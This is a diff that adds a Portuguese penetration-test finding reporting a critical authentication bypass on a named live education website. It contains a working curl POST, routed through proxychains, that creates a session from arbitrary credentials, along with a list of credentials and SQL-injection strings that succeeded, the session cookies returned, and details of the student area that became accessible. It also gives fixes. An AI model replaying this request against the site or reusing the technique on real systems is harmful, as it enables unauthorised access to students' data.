@@ -1,0 +1,69 @@
+F-001: Auth Bypass Total — /cadastro_incompleto.php
+================================================================
+Severidade: CRÍTICA
+Host: https://www.g7juridico.com.br
+Endpoint: /cadastro_incompleto.php
+Data: 04/09/2026
+Classificação OWASP: A1 (Broken Access Control) / A7 (Identification and Authentication Failures)
+
+DESCRIÇÃO
+----------
+O endpoint /cadastro_incompleto.php aceita QUALQUER combinação de email/senha 
+para "login", gerando um cookie de sessão (login_id) e redirecionando para 
+a área do aluno (/area-do-aluno). Não há validação de credenciais.
+
+REPRODUÇÃO
+----------
+Qualquer POST com Email e senha arbitrários gera sessão:
+
+  $ proxychains4 curl -s -v -X POST \
+    -d "Email=fake@fake.com&senha=qualquer&acao=login&Codigo=1&Pos=1&ref=1" \
+    "https://www.g7juridico.com.br/cadastro_incompleto.php"
+
+Resposta:
+  HTTP/1.1 302 Found
+  Set-Cookie: login_id=1788483239
+  Set-Cookie: aluno=0; path=/
+  location: area-do-aluno
+
+Credenciais testadas que TODAS funcionaram:
+  - admin@admin.com:admin
+  - admin@g7juridico.com.br:admin
+  - admin@g7juridico.com.br:123456
+  - suporte@g7juridico.com.br:g7juridico
+  - teste@teste.com:123456
+  - aluno@aluno.com:aluno
+  - admin:admin
+  - fake@fake.com:qualquer
+  - qualquer@coisa.com:x
+  - ':x (SQLi failed login)
+  - ' OR '1'='1' -- - :x
+
+O sistema também aceita login sem o campo acao=login, e com acao=recuperar 
+e acao=cadastro — todos geram sessão.
+
+IMPACTO
+-------
+1. Acesso total à área do aluno restrita (dashboard, cursos, materiais)
+2. Exposição de dados de alunos reais (cursos matriculados, materiais, simulados)
+3. Possibilidade de criar múltiplas sessões para ataques de brute-force em outras
+   funcionalidades
+4. Não há rate limiting ou captcha no formulário
+
+RECOMENDAÇÃO
+------------
+1. Implementar validação de credenciais no backend (comparação com hash no BD)
+2. Adicionar CSRF token ao formulário de login
+3. Implementar rate limiting e captcha
+4. Não criar sessão até que as credenciais sejam validadas
+5. Revisar lógica de autenticação em /cadastro_incompleto.php
+
+EVIDÊNCIA ADICIONAL
+-------------------
+O cookie gerado (`login_id=1788483237; aluno=0`) permite acesso ao dashboard:
+- Nome do curso: "DEFENSORIA PÚBLICA ESTADUAL / DPU - 2025"
+- Status: "Aguarde a confirmação do pagamento"
+- Roteiros de estudo (11 PDFs com hashes)
+- Simulados
+- Portal de dúvidas
+- Perfil (incompleto)
